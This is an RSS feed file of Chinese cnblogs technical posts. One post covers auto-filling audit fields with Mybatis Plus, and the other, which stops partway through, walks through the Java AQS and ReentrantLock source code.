<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>如何自动填充SQL语句中的公共字段 - 码农小胖哥</title>
<link>http://www.cnblogs.com/felordcn/p/13752898.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/felordcn/p/13752898.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1739473/202009/1739473-20200930085622894-46215229.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-前言&quot;&gt;1. 前言&lt;/h2&gt;
&lt;p&gt;我们在设计数据库的时候一定会带上新增、更新的时间、操作者等审计信息。 之所以带这些信息是因为假如有一天公司的数据库被人为删了，尽管可能有数据库备份可以恢复数据。但是我们仍然需要追踪到这个事是谁干的，在什么时间干的，具体干了哪些事等等，方便定责和修补。但是我们变更每条数据都要去显式变更这些信息就十分繁琐，我们希望无感知的来处理这些信息。&lt;/p&gt;
&lt;h2 id=&quot;2-通用方式&quot;&gt;2. 通用方式&lt;/h2&gt;
&lt;p&gt;那么有什么好的解决思路呢？在&lt;strong&gt;Spring Data&lt;/strong&gt;框架中提供&lt;code&gt;@CreatedBy&lt;/code&gt;和&lt;code&gt;@LastModifiedBy&lt;/code&gt;来捕捉谁创建或修改的实体以及&lt;code&gt;@CreatedDate&lt;/code&gt;和&lt;code&gt;@LastModifiedDate&lt;/code&gt;来捕捉合适创建或修改了实体。如果你使用相关的框架就可以使用这些特性。那么其实我们知道国内&lt;strong&gt;Spring Data JDBC&lt;/strong&gt;、&lt;strong&gt;Spring Data JPA&lt;/strong&gt;并不是主流，主流的是&lt;strong&gt;Mybatis&lt;/strong&gt;。那么我们有哪些选择？&lt;/p&gt;
&lt;h3 id=&quot;21-开发mybatis审计插件&quot;&gt;2.1 开发Mybatis审计插件&lt;/h3&gt;
&lt;p&gt;如果你使用了原生的&lt;strong&gt;Mybatis&lt;/strong&gt;可以编写一个审计插件来实现这些功能。我在之前讲解过&lt;strong&gt;Mybatis&lt;/strong&gt;插件的教程，并不是非常难的事。如果你想拿来就用，其实&lt;strong&gt;GitHub&lt;/strong&gt;上提供了很多可供选择的&lt;strong&gt;Mybatis&lt;/strong&gt;审计组件，本来我打算手写一个，但是确实人家写的好。你可以通过关键词&lt;strong&gt;Mybatis Audit&lt;/strong&gt;来搜索到它们选择一款最适合你的。&lt;/p&gt;
&lt;h3 id=&quot;22-mybatis-plus-自动填充&quot;&gt;2.2 Mybatis Plus 自动填充&lt;/h3&gt;
&lt;p&gt;如果你使用了&lt;strong&gt;Mybatis Plus&lt;/strong&gt;，可以借助于其自动填充功能来实现。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;基于 &lt;strong&gt;Mybatis Plus 3.3.0&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;只需要实现&lt;code&gt;MetaObjectHandler&lt;/code&gt;接口：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Component
public class MybatisAuditHandler implements MetaObjectHandler {
    @Override
    public void insertFill(MetaObject metaObject) {
        // 声明自动填充字段的逻辑。
        String userId = AuthHolder.getCurrentUserId();
        this.strictInsertFill(metaObject,&quot;creator&quot;,String.class, userId);
        this.strictInsertFill(metaObject,&quot;createTime&quot;, LocalDateTime.class,LocalDateTime.now());
    }

    @Override
    public void updateFill(MetaObject metaObject) {
        // 声明自动填充字段的逻辑。
        String userId = AuthHolder.getCurrentUserId();
        this.strictUpdateFill(metaObject,&quot;updater&quot;,String.class,userId);
        this.strictUpdateFill(metaObject,&quot;updateTime&quot;, LocalDateTime.class,LocalDateTime.now());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后我们扩展一下&lt;strong&gt;Mybatis Plus&lt;/strong&gt;的&lt;code&gt;Model&amp;lt;T&amp;gt;&lt;/code&gt;把公共审计字段放进去并声明对应的填充策略：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class BaseEntity&amp;lt;T extends Model&amp;lt;?&amp;gt;&amp;gt; extends Model&amp;lt;T&amp;gt; {

    @TableField(fill = FieldFill.INSERT)
    private String creator;
    @TableField(fill = FieldFill.INSERT)
    private LocalDateTime addTime;
    @TableField(fill = FieldFill.UPDATE)
    private String updater;
    @TableField(fill = FieldFill.UPDATE)
    private LocalDateTime updateTime;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后我们的实体类不再直接继承&lt;code&gt;Model&amp;lt;T&amp;gt;&lt;/code&gt;改为上面的&lt;code&gt;BaseEntity&amp;lt;T&amp;gt;&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Data
@EqualsAndHashCode(callSuper = false)
public class UserInfo extends BaseEntity&amp;lt;UserInfo&amp;gt; {
    @TableId(value = &quot;user_id&quot;, type = IdType.ASSIGN_ID)
    private String userId;
    private String username;

    @Override
    protected Serializable pkVal() {
        return this.userId;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样我们就不用再关心这几个公共字段了，当然你可以根据需要添加更多你需要填充的字段。&lt;/p&gt;
&lt;h2 id=&quot;3-总结&quot;&gt;3. 总结&lt;/h2&gt;
&lt;p&gt;今天我们SQL审计中的一些公共字段的自动填充的常用方案进行了一些介绍，特别对&lt;strong&gt;Mybatis Plus&lt;/strong&gt;提供的功能进行了介绍相信能够帮助你简化一些样板代码的编写。但是SQL审计并不仅仅这么简单，根据你的业务的不同会有不同的设计。如果设计的更加精细化的话，会通过镜像或探针的方式采集所有数据库的访问流量，并基于SQL语法、语义的解析技术，记录下数据库的所有访问和操作行为。有空可以从网上获取相关的资料进行了解。今天就到这里，关注：&lt;strong&gt;码农小胖哥&lt;/strong&gt;，获取更多的编程实战干货。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;关注公众号：Felordcn 获取更多资讯&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://felord.cn&quot;&gt;个人博客：https://felord.cn&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 30 Sep 2020 00:56:00 +0000</pubDate>
<dc:creator>码农小胖哥</dc:creator>
<og:description>1. 前言 我们在设计数据库的时候一定会带上新增、更新的时间、操作者等审计信息。 之所以带这些信息是因为假如有一天公司的数据库被人为删了，尽管可能有数据库备份可以恢复数据。但是我们仍然需要追踪到这个事</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/felordcn/p/13752898.html</dc:identifier>
</item>
<item>
<title>你来讲讲AQS是什么吧？都是怎么用的？ - 纪莫</title>
<link>http://www.cnblogs.com/jimoer/p/13747291.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jimoer/p/13747291.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;在Java面试的时候，多线程相关的知识是躲不掉的，肯定会被问。我就被问到了AQS的知识，就直接了当的问，AQS知道是什么吧，来讲讲它是怎么实现的，以及哪些地方用到了它。当时自己确实没有讲好，所以这次来总结一下这个知识点。&lt;/p&gt;
&lt;h2 id=&quot;什么是aqs&quot;&gt;什么是AQS&lt;/h2&gt;
&lt;p&gt;AQS全称是&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;，形如其名，抽象队列同步器。&lt;br/&gt;AQS定义了两种资源共享模式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;独占式，每次只能有一个线程持有锁，例如&lt;code&gt;ReentrantLock&lt;/code&gt;实现的就是独占式的锁资源。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;共享式，允许多个线程同时获取锁，并发访问共享资源，&lt;code&gt;ReentrantWriteLock&lt;/code&gt;和&lt;code&gt;CountDownLatch&lt;/code&gt;等就是实现的这种模式。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;它维护了一个&lt;code&gt;volatile&lt;/code&gt;的&lt;code&gt;state&lt;/code&gt;变量和一个FIFO（先进先出）的队列。&lt;br/&gt;其中&lt;code&gt;state&lt;/code&gt;变量代表的是竞争资源标识，而队列代表的是竞争资源失败的线程排队时存放的容器。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public abstract class AbstractQueuedSynchronizer extends AbstractOwnableSynchronizer implements java.io.Serializable {
        ...
        /**
         * The synchronization state.
         */
        private volatile int state;
        /**
     * Wait queue node class.
     **/
     static final class Node {
                ...
        }
        ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;AQS中提供了操作state的方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;getState();&lt;/li&gt;
&lt;li&gt;setState();&lt;/li&gt;
&lt;li&gt;compareSetState();&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final int getState() {
    return state;
}
protected final void setState(int newState) {
    state = newState;
}
protected final boolean compareAndSetState(int expect, int update) {
    // See below for intrinsics setup to support this
    return unsafe.compareAndSwapInt(this, stateOffset, expect, update);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;是一个抽象类，他采用&lt;strong&gt;模板方法&lt;/strong&gt;的设计模式，规定了&lt;strong&gt;独占&lt;/strong&gt;和&lt;strong&gt;共享&lt;/strong&gt;模式需要实现的方法，并且将一些通用的功能已经进行了实现，所以不同模式的使用方式，只需要自己定义好实现共享资源的获取与释放即可，至于具体线程在等待队列中的维护（获取资源入队列、唤醒出队列等），AQS已经实现好了。&lt;/p&gt;
&lt;p&gt;所以根据共享资源的模式一般实现的方法有如下几个：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;isHeldExclusively()；&lt;/code&gt;// 是否为独占模式；但是只有使用到了Condition的，才需要去实现它。例如：ReentrantLock。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryAcquire(int arg);&lt;/code&gt; // 独占模式；尝试获取资源，成功返回true，失败返回false。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryRelease(int arg) ;&lt;/code&gt; // 独占模式；尝试释放资源，成功返回true，失败返回false。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;int tryAcquireShared(int arg);&lt;/code&gt; // 共享模式；尝试获取资源，负数表示失败；0表示成功，但是没有剩余可用资源了；正数表示成功，且有剩余可用资源。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean tryReleaseShared(int arg) ;&lt;/code&gt; // 共享欧式；尝试释放资源，若释放资源后允许唤醒后续等待节点返回true，否则返回false。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面的这几个方法在&lt;code&gt;AbstractQueuedSynchronizer&lt;/code&gt;这个抽象类中，都没有被定义为abstract的，说明这些方法都是可以按需实现的，共享模式下可以只实现共享模式的方法（例如&lt;code&gt;CountDownLatch&lt;/code&gt;），独占模式下可以只实现独占模式的方法（例如&lt;code&gt;ReentrantLock&lt;/code&gt;）,也支持两种都实现，两种模式都使用（例如&lt;code&gt;ReentrantReadWriteLock&lt;/code&gt;）。&lt;/p&gt;
&lt;h2 id=&quot;aqs源码分析&quot;&gt;AQS源码分析&lt;/h2&gt;
&lt;p&gt;我们先简单介绍AQS的两种模式的实现类的代表&lt;code&gt;ReentrantLock&lt;/code&gt;（&lt;strong&gt;独占模式&lt;/strong&gt;）和&lt;code&gt;CountDownLatch&lt;/code&gt;（&lt;strong&gt;共享模式&lt;/strong&gt;），是如何来共享资源的一个过程，然后再详细通过AQS的源码来分析整个实现过程。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;在初始化的时候state=0，表示资源未被锁定。当A线程执行&lt;code&gt;lock()&lt;/code&gt;方法时，会调用&lt;code&gt;tryAcquire()&lt;/code&gt;方法，将AQS中队列的模式设置为独占，并将独占线程设置为线程A，以及将&lt;code&gt;state+1&lt;/code&gt;。&lt;br/&gt;这样在线程A没有释放锁前，其他线程来竞争锁，调用&lt;code&gt;tryAcquire()&lt;/code&gt;方法时都会失败，然后竞争锁失败的线程就会进入到队列中。当线程A调用执行&lt;code&gt;unlock()&lt;/code&gt;方法将&lt;code&gt;state=0&lt;/code&gt;后，其他线程才有机会获取锁（注意&lt;code&gt;ReentrantLock&lt;/code&gt;是可重入的，同一线程多次获取锁时&lt;code&gt;state&lt;/code&gt;值会进行垒加的，在释放锁时也要释放相应的次数才算完全释放了锁）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CountDownLatch&lt;/code&gt;会将任务分成N个子线程去执行，state的初始值也是N（&lt;code&gt;state&lt;/code&gt;与子线程数量一致）。N个子线程是并行执行的，每个子线程执行完成后&lt;code&gt;countDown()&lt;/code&gt;一次，&lt;code&gt;state&lt;/code&gt;会通过CAS方式减1。直到所有子线程执行完成后（&lt;code&gt;state=0&lt;/code&gt;）,会通过&lt;code&gt;unpark()&lt;/code&gt;方法唤醒主线程，然后主线程就会从&lt;code&gt;await()&lt;/code&gt;方法返回，继续后续操作。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;独占模式分析&quot;&gt;独占模式分析&lt;/h3&gt;
&lt;p&gt;在AbstractQueuedSynchronizer的类里面有一个静态内部类Node。它代表的是队列中的每一个节点。&lt;br/&gt;其中Node节点有如下几个属性：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 节点的状态
volatile int waitStatus;
// 当前节点的前一个节点
volatile Node prev;
// 当前节点的后一个节点
volatile Node next;
// 当前节点中所包含的线程对象
volatile Thread thread;
// 等待队列中的下一个节点
Node nextWaiter;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;每个属性代表的什么，已经写在代码注释中了。其中Node类中还有几个常量，代表了几个节点的状态（&lt;code&gt;waitStatus&lt;/code&gt;）值。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;       /** waitStatus value to indicate thread has cancelled */
        static final int CANCELLED =  1;
        /** waitStatus value to indicate successor's thread needs unparking */
        static final int SIGNAL    = -1;
        /** waitStatus value to indicate thread is waiting on condition */
        static final int CONDITION = -2;
        /**
         * waitStatus value to indicate the next acquireShared should
         * unconditionally propagate
         */
        static final int PROPAGATE = -3;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先节点的状态值waitStatus默认是0，然后下面几个常量有自己具体的含义。&lt;br/&gt;&lt;code&gt;CANCELLED = 1；&lt;/code&gt; 代表的是当前节点从同步队列中取消，当timeout或被中断（响应中断的情况下），会触发变更为此状态，进入该状态后的结点将不会再变化。&lt;br/&gt;&lt;code&gt;SIGNAL = -1；&lt;/code&gt; 代表后继节点处于等待状态。后继结点入队时，会将前继结点的状态更新为SIGNAL。&lt;br/&gt;&lt;code&gt;CONDITION = -2;&lt;/code&gt; 节点在等待队列中，节点线程等待在Condition上，当其他线程对Condition调用了 &lt;code&gt;signal()&lt;/code&gt;方法后，该节点将会从等待队列中转移到同步队列中，加入到对同步状态的获取中。&lt;br/&gt;&lt;code&gt;PROPAGATE = -3;&lt;/code&gt; 表示在共享模式下，前继节点在释放资源后会唤醒后继节点，并将这种共享模式传播下去。&lt;/p&gt;
&lt;p&gt;通过上面几个固定的常量值，我们可以看出节点状态中通常负数值通常表示节点处于有效的等待状态，而正数值代表节点已经被取消了。&lt;/p&gt;
&lt;p&gt;所以AQS源码中有很多地方都用&lt;code&gt;waitStatus&amp;gt;0&lt;/code&gt;或&lt;code&gt;waitStatus&amp;lt;0&lt;/code&gt;这种方式来判断队列中节点的是否正常。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;独占模式下，只能有一个线程占有锁资源，其他竞争资源的线程，在竞争失败后都会进入到等待队列中，等待占有锁资源的线程释放锁，然后再重新被唤醒竞争资源。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;reentrantlock加锁过程&quot;&gt;ReentrantLock加锁过程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;默认是非公平锁，就是说，线程在竞争锁的时候并不是按照先来后到的顺序来获取锁的，但是&lt;code&gt;ReentrantLock&lt;/code&gt;也是支持公平锁的，在创建的时候传入一个参数值即可。&lt;br/&gt;下面我们以&lt;code&gt;ReentrantLock&lt;/code&gt;默认情况下的加锁来分析AQS的源码。&lt;br/&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;并没有直接继承AQS类，而是通过内部类来继承AQS类的，这样自己的实现功能，自己用。&lt;br/&gt;我们在用&lt;code&gt;ReentrantLock&lt;/code&gt;加锁的时候都是调用的用&lt;code&gt;lock()&lt;/code&gt;方法，那么我们来看看默认非公平锁下，&lt;code&gt;lock()&lt;/code&gt;方法的源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * Sync object for non-fair locks
 */
static final class NonfairSync extends Sync {
    private static final long serialVersionUID = 7316153563782823691L;

    /**
     * Performs lock.  Try immediate barge, backing up to normal
     * acquire on failure.
     */
    final void lock() {
        if (compareAndSetState(0, 1))
            setExclusiveOwnerThread(Thread.currentThread());
        else
            acquire(1);
    }

    protected final boolean tryAcquire(int acquires) {
        return nonfairTryAcquire(acquires);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过源码可以看到，&lt;code&gt;lock()&lt;/code&gt;方法，首先是通过CAS的方式抢占锁，如果抢占成功则将state的值设置为1。然后将对象独占线程设置为当前线程。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final void setExclusiveOwnerThread(Thread thread) {
    exclusiveOwnerThread = thread;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果抢占锁失败，就会调用&lt;code&gt;acquire()&lt;/code&gt;方法，这个&lt;code&gt;acquire()&lt;/code&gt;方法的实现就是在AQS类中了，说明具体抢占锁失败后的逻辑，AQS已经规定好了模板。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final void acquire(int arg) {
    if (!tryAcquire(arg) &amp;amp;&amp;amp;
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面已经介绍了，独占模式是需要实现&lt;code&gt;tryAcquire()&lt;/code&gt;方法的，这里首先就是通过&lt;code&gt;tryAcquire()&lt;/code&gt;方法抢占锁，如果成功返回true，失败返回false。&lt;code&gt;tryAcquire()&lt;/code&gt;方法的具体实现，是在&lt;code&gt;ReentrantLock&lt;/code&gt;里面的，AQS类中默认是直接抛出异常的。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先获取state值，如果state值为0，说明无锁，那么通过CAS尝试加锁，成功后，将独占线程设置为当前线程。&lt;/li&gt;
&lt;li&gt;如果state值不为0，并且当前的独占线程和当前线程为同一线程，那么state重入次数加1。&lt;/li&gt;
&lt;li&gt;如果state值不为0，并且当前线程不是独占线程，直接返回false。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected final boolean tryAcquire(int acquires) {
    return nonfairTryAcquire(acquires);
}
final boolean nonfairTryAcquire(int acquires) {
     final Thread current = Thread.currentThread();
     int c = getState();// 获取state值
     if (c == 0) { 
     // 如果state值为0，说明无锁，那么就通过cas方式，尝试加锁，成功后将独占线程设置为当前线程
         if (compareAndSetState(0, acquires)) {
             setExclusiveOwnerThread(current);
             return true;
         }
     }
     else if (current == getExclusiveOwnerThread()) { // 如果是同一个线程再次来获取锁，那么就将state的值进行加1处理（可重入锁的，重入次数）。
         int nextc = c + acquires;
         if (nextc &amp;lt; 0) // overflow
             throw new Error(&quot;Maximum lock count exceeded&quot;);
         setState(nextc);
         return true;
     }
     return false;
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们继续来看&lt;code&gt;acquire()&lt;/code&gt;方法，在执行完&lt;code&gt;tryAcquire()&lt;/code&gt;方法后，如果加锁失败那么就会执行&lt;code&gt;addWaiter()&lt;/code&gt;方法和&lt;code&gt;acquireQueued()&lt;/code&gt;，这两个方法的作用是将竞争锁失败的线程放入到等待队列中。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200927231220316.png#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;code&gt;addWaiter()&lt;/code&gt;方法的源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Node addWaiter(Node mode) {
        // 用参数指定的模式将当前线程封装成队列中的节点（EXCLUSIVE【独占】，SHARED【共享】）
    Node node = new Node(Thread.currentThread(), mode);
    // Try the fast path of enq; backup to full enq on failure
    Node pred = tail;
    // tail是队列的尾部节点，初始时队列为空，尾部节点为null，直接调用enq将节点插入队列
    if (pred != null) {
    // 将当前线程节点的前级节点指向队列的尾部节点。
        node.prev = pred;
        // 通过CAS方式将节点插入到队列中
        if (compareAndSetTail(pred, node)) {
        // 插入成功后，将原先的尾部节点的后级节点指向新的尾部节点
            pred.next = node;
            return node;
        }
    }
    // 如果尾部节点为空或通过CAS插入队列失败则通过enq方法插入节点
    enq(node);
    return node;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;addWaiter()&lt;/code&gt;中主要做了三件事：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;将当前线程封装成Node。&lt;/li&gt;
&lt;li&gt;判断队列中尾部节点是否为空，若不为空，则将当前线程的Node节点通过CAS插入到尾部。&lt;/li&gt;
&lt;li&gt;如果尾部节点为空或CAS插入失败则通过&lt;code&gt;enq()&lt;/code&gt;方法插入到队列中。&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;那么enq方法是又是怎么插入节点的呢？&quot;&gt;那么enq()方法是又是怎么插入节点的呢？&lt;/h4&gt;
&lt;p&gt;enq()方法源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private Node enq(final Node node) {
        // 看到死循环，就明白是通过自旋咯
    for (;;) {
    // 当tail节点为空时直接将当前节点设置成尾部节点，并插入到队列中，以及设置它为head节点。
        Node t = tail;
        if (t == null) { // Must initialize
            if (compareAndSetHead(new Node()))
                tail = head;
        } else {
        // 若是因为在addWaiter()方法中插入失败或第二次进入循环，那么将当前线程的前级节点指向尾部节点，并通过CAS方式将尾部节点指向当前线程的节点。
            node.prev = t;
            if (compareAndSetTail(t, node)) {
                t.next = node;
                return t;
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实enq()方法主要就是通过自旋将数据插入到队列中的操作：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当队列为空时，将当前节点设置为头节点和尾节点。&lt;/li&gt;
&lt;li&gt;进入二次循环后，将node添加到尾部。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这样addWaiter()方法就构造了一个队列，并将当前线程添加到了队列中了。&lt;br/&gt;我们再回到&lt;code&gt;acquire()&lt;/code&gt;方法中。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200927231220316.png#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;现在就剩下&lt;code&gt;acquireQueued()&lt;/code&gt;方法没看了，这个方法中的操作挺多的。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final boolean acquireQueued(final Node node, int arg) {
    boolean failed = true;
    try {
        boolean interrupted = false;
        for (;;) {
        // 获取前级节点，如果未null，则抛出异常
            final Node p = node.predecessor();
        // 如果前级节点为head，并且执行抢占锁成功。
            if (p == head &amp;amp;&amp;amp; tryAcquire(arg)) {
            // 抢占锁成功，当前节点成功新的head节点
                setHead(node);
                // 然后将原先的head节点指向null，方便垃圾回收进行回收
                p.next = null; // help GC
                failed = false;
                return interrupted;
            }
            // 如果当前节点不为head,或者抢占锁失败。就根据节点的状态决定是否需要挂起线程。
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                interrupted = true;
        }
    } finally {
        if (failed) // 如果获取锁异常，则出取消获取锁操作。
            cancelAcquire(node);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Node predecessor() throws NullPointerException {
    Node p = prev;
    if (p == null)
        throw new NullPointerException();
    else
        return p;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;首先获取节点的前级节点。&lt;/li&gt;
&lt;li&gt;如果当前节点的前级节点是head那么就可以去抢占锁了。&lt;/li&gt;
&lt;li&gt;抢占成功后就将新节点设置为head，原先的head置为空。&lt;/li&gt;
&lt;li&gt;如果抢占锁失败，则根据&lt;code&gt;waitStatus&lt;/code&gt;值决定是否挂起线程。&lt;/li&gt;
&lt;li&gt;最后，通过&lt;code&gt;cancelAcquire()&lt;/code&gt;取消获取锁操作。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下面看一下&lt;code&gt;shouldParkAfterFailedAcquire()&lt;/code&gt;和&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;这两个方法是如何挂起线程的。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) {
    int ws = pred.waitStatus;// 获取前级节点
    if (ws == Node.SIGNAL)// 如果前级节点的waitStatus值为SIGNAL(-1),说明当前节点也已经在等待唤醒了，直接返回true。
        return true;
  // 如果前级节点的waitStatus值大于0说明前级节点已经取消了。
    if (ws &amp;gt; 0) {
   // 如果前级节点已经是CANCEL状态了，那么会继续向前找，直到找到的节点不是CANCEL（waitStatue&amp;gt;0）状态的节点，然后将其设置为当前节点的前级节点。
        do {
            node.prev = pred = pred.prev;
        } while (pred.waitStatus &amp;gt; 0);
        pred.next = node;
    } else {
    // 如果前级节点为0或者其他不为-1的小于0的值，则将当前节点的前级节点设置为 SIGNAL(-1)
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    return false;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;方法的作用就是挂起线程，如果&lt;code&gt;shouldParkAfterFailedAcquire()&lt;/code&gt;方法成功，会执行&lt;code&gt;parkAndCheckInterrupt()&lt;/code&gt;方法，它通过&lt;code&gt;LockSupport的park()&lt;/code&gt;方法，将当前线程挂起（WAITING），它需要&lt;code&gt;unpark()&lt;/code&gt;方法唤醒它，通过这样一种FIFO机制的等待，来实现Lock操作。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private final boolean parkAndCheckInterrupt() {
    LockSupport.park(this);
    return Thread.interrupted();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;LockSupport&lt;/code&gt;是JDK从1.6开始提供的一个线程同步源语工具类，在这里主要用到了它的两个方法，挂起线程和唤醒线程：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void park() {
    UNSAFE.park(false, 0L);
}
public static void unpark(Thread thread) {
    if (thread != null)
        UNSAFE.unpark(thread);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;LockSupport&lt;/code&gt;的挂起和唤醒线程都是不可重入的，它由一个许可标志，当调用park()时就会将许可设置为0，挂起线程，如果再调用一次&lt;code&gt;park()&lt;/code&gt;，会阻塞线程。当调用&lt;code&gt;unpark()&lt;/code&gt;时才会将许可标志设置成1。&lt;/p&gt;
&lt;h3 id=&quot;reentrantlock释放锁过程&quot;&gt;ReentrantLock释放锁过程&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ReentrantLock&lt;/code&gt;释放锁的过程主要有两个阶段：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;释放锁。&lt;/li&gt;
&lt;li&gt;唤醒挂起的线程。&lt;br/&gt;&lt;code&gt;unlock()&lt;/code&gt;方法的源码如下。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void unlock() {
   sync.release(1);
}
&lt;/code&gt;
&lt;/pre&gt;
